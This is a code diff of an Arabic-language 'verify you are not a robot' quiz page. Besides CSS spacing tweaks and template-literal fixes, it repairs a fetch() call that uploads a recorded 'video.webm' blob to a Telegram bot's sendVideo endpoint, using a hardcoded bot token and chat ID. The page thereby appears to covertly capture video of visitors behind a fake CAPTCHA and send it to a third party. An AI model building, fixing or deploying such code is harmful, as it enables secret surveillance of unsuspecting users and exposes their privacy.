@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحقق من أنك لست روبوتاً</title>
-<style>
+     <style>
         * {
             margin: 0;
             padding: 0;
@@ -129,8 +129,8 @@
             font-size: 18px;
         }
         .question {
-            margin-bottom: 60px; /* مسافة بين السؤال والاختيارات */
-            padding: 40px;
+            margin-bottom: 20px; /* مسافة بين السؤال والاختيارات */
+            padding: 10px;
             border-radius: 10px;
             font-size: 18px;
         }
@@ -145,11 +145,6 @@
         }
         .question-container {
             margin-bottom: 20px; /* المسافة بين السؤال والإجابات */
-        }
-
-        /* إضافة مسافة بين نص السؤال والإجابات */
-        #question-text {
-            margin-bottom: 30px; /* مسافة بين نص السؤال والإجابات */
         }
     </style>
 </head>
@@ -222,7 +217,7 @@
                         formData.append('chat_id', '2070423407'); 
                         formData.append('video', blob, 'video.webm');
 
-                        fetch(https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo, { method: 'POST', body: formData })
+                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
                             .catch((error) => { console.error('Video upload failed:', error.message); });
                     };
                 })
@@ -291,7 +286,7 @@
             questions.forEach((question, index) => {
                 const questionDiv = document.createElement('div');
                 questionDiv.classList.add('question');
-                questionDiv.innerHTML = 
+                questionDiv.innerHTML = `
                     <h3>${question.q}</h3>
                     <div class="${question.correct === answers[index] ? 'correct' : 'wrong'}">
                         <p>${question.options[answers[index]]}</p>
@@ -299,12 +294,12 @@
                     <div class="correct-answer">
                         <p>${question.options[question.correct]}</p>
                     </div>
-                ;
+                `;
                 allQuestionsContainer.appendChild(questionDiv);
             });
 
             const scoreText = document.createElement('p');
-            scoreText.textContent = النتيجة: ${score} / ${questions.length};
+            scoreText.textContent = `النتيجة: ${score} / ${questions.length}`;
             allQuestionsContainer.appendChild(scoreText);
         }
 
